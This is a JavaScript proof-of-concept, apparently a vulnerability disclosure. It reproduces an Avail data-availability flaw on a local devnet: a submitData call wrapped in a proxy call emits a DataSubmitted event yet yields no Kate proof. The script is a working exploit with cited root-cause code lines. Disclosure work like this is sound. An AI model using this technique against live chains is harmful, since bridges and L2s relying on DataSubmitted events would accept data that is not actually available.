/**
 * BONDA PoC — AVAIL-DA-001 (local devnet)
 *
 * Proof:
 *   Proxy::proxy { call: DataAvailability::submit_data } →
 *   all signed extensions pass → executes → DataSubmitted event emitted
 *   BUT transaction_filter.rs:38: nb_iterations > 0 → None → DA omitted
 *
 * Code references (commit 510ee26, specVersion 51):
 *   check_batch_transactions.rs:232 — proxy path only blocks send_message
 *   check_app_id.rs:76              — AppId=0 → immediately Ok()
 *   transaction_filter.rs:38        — nb_iterations > 0 → None
 */
"use strict";

const sdk = require("avail-js-sdk");

const WS  = process.env.WS_URL  || "ws://localhost:9944";
const RPC = process.env.RPC_URL || "http://localhost:9944";

function rpcPost(method, params) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({ jsonrpc: "2.0", id: 1, method, params });
    const url  = new URL(RPC);
    const isHttps = url.protocol === "https:";
    const mod  = isHttps ? require("node:https") : require("node:http");
    const opts = {
      hostname: url.hostname,
      port:     url.port || (isHttps ? 443 : 80),
      path:     url.pathname || "/",
      method:   "POST",
      headers:  { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) },
    };
    const req = mod.request(opts, (res) => {
      let data = "";
      res.on("data", (d) => (data += d));
      res.on("end", () => { try { resolve(JSON.parse(data)); } catch (e) { reject(e); } });
    });
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

async function submitAndWait(api, tx, account) {
  return new Promise((resolve, reject) => {
    tx.signAndSend(account, ({ status, events, dispatchError }) => {
      if (dispatchError) {
        if (dispatchError.isModule) {
          const dec = api.registry.findMetaError(dispatchError.asModule);
          return reject(new Error(`DispatchError: ${dec.section}.${dec.name}: ${dec.docs}`));
        }
        return reject(new Error(`DispatchError: ${dispatchError.toString()}`));
      }
      if (status.isInBlock) {
        resolve({ blockHash: status.asInBlock.toHex(), events });
      }
    }).catch(reject);
  });
}

// Extract txIndex from the event's phase (instead of comparing hashes)
function txIndexFromEvents(events) {
  for (const { event, phase } of events) {
    if (phase.isApplyExtrinsic) {
      // Use the phase of the System.ExtrinsicSuccess or System.ExtrinsicFailed event
      if (event.section === "system" &&
          (event.method === "ExtrinsicSuccess" || event.method === "ExtrinsicFailed")) {
        return phase.asApplyExtrinsic.toNumber();
      }
    }
  }
  return -1;
}

async function waitFinalized(api, blockHash) {
  // Wait until the given block is finalized (up to 30 seconds)
  for (let i = 0; i < 30; i++) {
    const finalHead = await api.rpc.chain.getFinalizedHead();
    const finalNum  = (await api.rpc.chain.getHeader(finalHead)).number.toNumber();
    const blockNum  = (await api.rpc.chain.getHeader(blockHash)).number.toNumber();
    if (finalNum >= blockNum) return;
    await new Promise(r => setTimeout(r, 1000));
  }
  console.log("  (finalization timeout — continuing anyway)");
}

async function main() {
  console.log("=".repeat(62));
  console.log("BONDA PoC — AVAIL-DA-001");
  console.log("Proxy-wrapped submit_data: DataSubmitted event YES, DA proof NO");
  console.log("=".repeat(62));

  const api = await sdk.initialize(WS);

  const keyring = new sdk.polkadotApi.Keyring({ type: "sr25519" });
  const alice   = keyring.addFromUri("//Alice");
  const bob     = keyring.addFromUri("//Bob");

  const chain   = await api.rpc.system.chain();
  const specVer = api.runtimeVersion.specVersion.toNumber();
  console.log(`\nChain: ${chain.toHuman()}  specVersion: ${specVer}`);
  console.log(`Alice: ${alice.address}`);
  console.log(`Bob  : ${bob.address}`);

  // ── BASELINE: direct submit_data ─────────────────────────────────────────
  console.log("\n" + "─".repeat(62));
  console.log("[BASELINE] Direct DataAvailability.submitData — should be in DA");

  const baselineTx = api.tx.dataAvailability.submitData("0x42415345"); // "BASE"
  const { blockHash: bh0, events: ev0 } = await submitAndWait(api, baselineTx, alice);
  const txIdx0 = txIndexFromEvents(ev0);
  const dsEv0  = ev0.find(e => e.event.section === "dataAvailability" && e.event.method === "DataSubmitted");

  console.log(`  DataSubmitted event: ${dsEv0 ? "YES ✓" : "NO ✗"}`);
  console.log(`  block: ${bh0}  txIndex: ${txIdx0}`);
  console.log("  waiting for finalization...");
  await waitFinalized(api, bh0);

  const p0 = await rpcPost("kate_queryDataProof", [txIdx0, bh0]);
  const ok0 = !p0.error && p0.result != null;
  console.log(`  kate_queryDataProof: ${ok0 ? "PROOF EXISTS ✓" : "ERROR/NULL ✗ — " + JSON.stringify(p0.error || p0.result)}`);

  // ── STEP 1: Alice adds Bob as proxy ──────────────────────────────────────
  console.log("\n" + "─".repeat(62));
  console.log("[STEP 1] Alice.proxy.addProxy(Bob, Any, delay=0)");
  try {
    const addProxyTx = api.tx.proxy.addProxy(bob.address, "Any", 0);
    const { blockHash: bh1 } = await submitAndWait(api, addProxyTx, alice);
    console.log(`  addProxy in block: ${bh1}`);
  } catch (e) {
    if (e.message.includes("Duplicate")) {
      console.log("  (already registered, skipping)");
    } else {
      throw e;
    }
  }

  // ── STEP 2: ATTACK ───────────────────────────────────────────────────────
  console.log("\n" + "─".repeat(62));
  console.log("[STEP 2] ATTACK: Bob.proxy.proxy(real=Alice, call=submitData(0x424f4e4441))");
  console.log("         AppId=0  →  CheckAppId short-circuits (Ok immediately)");
  console.log("         CheckBatchTransactions.recursive_proxy_call checks send_message only");
  console.log("         → passes all validation → executes → DataSubmitted emitted");

  const innerCall  = api.tx.dataAvailability.submitData("0x424f4e4441"); // "BONDA"
  const attackTx   = api.tx.proxy.proxy(alice.address, null, innerCall);
  const attackHash = attackTx.hash.toHex();

  const { blockHash: bh2, events: ev2 } = await submitAndWait(api, attackTx, bob);
  const txIdx2 = txIndexFromEvents(ev2);
  const dsEv2  = ev2.find(e => e.event.section === "dataAvailability" && e.event.method === "DataSubmitted");

  console.log(`\n  tx hash   : ${attackHash}`);
  console.log(`  block     : ${bh2}`);
  console.log(`  txIndex   : ${txIdx2}`);
  console.log(`  DataSubmitted event: ${dsEv2 ? "YES ✓  ← chain says: DA submission successful" : "NO ✗"}`);
  if (dsEv2) {
    console.log(`  event.who : ${dsEv2.event.data.toHuman()?.who}`);
    console.log(`  data_hash : ${dsEv2.event.data.toHuman()?.dataHash}`);
  }

  console.log("  waiting for finalization...");
  await waitFinalized(api, bh2);

  const p2 = await rpcPost("kate_queryDataProof", [txIdx2, bh2]);

  // ── RESULT ───────────────────────────────────────────────────────────────
  console.log("\n" + "=".repeat(62));
  console.log("RESULT");
  console.log("=".repeat(62));

  if (p2.error || p2.result == null) {
    console.log(`kate_queryDataProof(txIndex=${txIdx2}): ${JSON.stringify(p2.error || p2.result)}`);
    console.log("\n✅ CONFIRMED — AVAIL-DA-001 reproduced on specVersion 51");
    console.log("\n   BASELINE : direct submitData → DataSubmitted ✓, kate proof EXISTS ✓");
    console.log("   ATTACK   : Proxy::proxy { submitData } → DataSubmitted ✓");
    console.log("              kate_queryDataProof → NULL/ERROR  ← DATA NOT IN DA");
    console.log("\n   An L2 or bridge that trusts DataSubmitted events or extrinsic");
    console.log("   success as DA completion will incorrectly believe the data is");
    console.log("   available through the Kate proof path.");
  } else {
    console.log(`kate_queryDataProof: ${JSON.stringify(p2.result, null, 2)}`);
    console.log("\n⚠️  Unexpected result — investigate above output.");
  }

  console.log("\n" + "─".repeat(62));
  console.log("Root cause code references (commit 510ee26, mainnet specVersion 51):");
  console.log("  check_app_id.rs:76       — AppId=0 bypasses all AppId validation");
  console.log("  check_batch_txs.rs:232   — recursive_proxy_call: no submit_data guard");
  console.log("                             (cf. recursive_batch_call:193 which HAS the guard)");
  console.log("  transaction_filter.rs:38 — nb_iterations > 0 → None (DA extraction skipped)");
  console.log("─".repeat(62));

  await sdk.disconnect();
  process.exit(0);
}

main().catch((e) => {
  console.error("\nError:", e.message || e);
  process.exit(1);
});
